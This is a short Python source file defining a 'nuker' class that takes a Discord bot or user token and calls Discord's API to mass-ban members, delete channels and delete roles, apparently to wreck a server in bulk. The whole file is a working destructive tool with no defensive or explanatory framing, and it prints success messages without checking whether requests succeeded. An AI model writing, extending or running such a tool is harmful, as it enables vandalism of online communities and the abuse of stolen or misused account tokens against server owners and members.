import requests, threading

class nuker:
    def __init__(self, token: str, bot: bool):
        self.token = token
        self.authHeaders = {"Authorization": f"Bot {self.token}"} if bot is True else {"Authorization": self.token}

    def ban(self, guildId: int, memberId: int):
        try:
            res = requests.put(
                f"https://discord.com/api/v9/guilds/{guildId}/bans/{memberId}",
                headers = self.authHeaders,
                data={
                    "delete_message_days": 1,
                    "reason": "lol"
                }
            )
            with threading.Lock(): print(f"   Banned user {memberId}!")
        except:
            with threading.Lock():print(f"   ** Failed to ban user {memberId}.")
    def channel(self, channelId: int):
        try:
            res = requests.delete(
                f"https://discord.com/api/v8/channels/{channelId}",
                headers = self.authHeaders
            )
            with threading.Lock(): print(f"   Deleted channel {channelId}!")
        except:
            with threading.Lock(): print(f"   ** Delete channel id {channelId} failed.")

    def role(self, guildId:int, roleId: int):
        try:
            res = requests.delete(
                f"https://discord.com/api/v8/guilds/{guildId}/roles/{roleId}",
                headers = self.authHeaders
            )
            with threading.Lock(): print(f"   Deleted role {roleId}!")
        except:
            with threading.Lock():print(f"   ** Failed to delete role {roleId}.")